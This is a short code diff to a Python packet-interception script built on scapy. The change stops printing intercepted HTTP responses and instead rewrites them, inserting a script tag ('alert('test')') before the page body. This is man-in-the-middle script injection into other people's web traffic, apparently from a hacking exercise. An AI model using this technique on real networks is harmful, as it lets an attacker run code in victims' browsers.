@@ -23,7 +23,9 @@ def process_packet(pkt):
             pkt.set_payload(bytes(new_packet))
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] HTTP Response")
-            print(scapy_packet.show())
+            modified_load = bytes(scapy_packet[scapy.Raw].load.replace(b"<body>", b"<script>alert('test')</script><body>"))
+            new_packet = set_load(scapy_packet, modified_load)
+            pkt.set_payload(bytes(new_packet))
 
     pkt.accept()
 
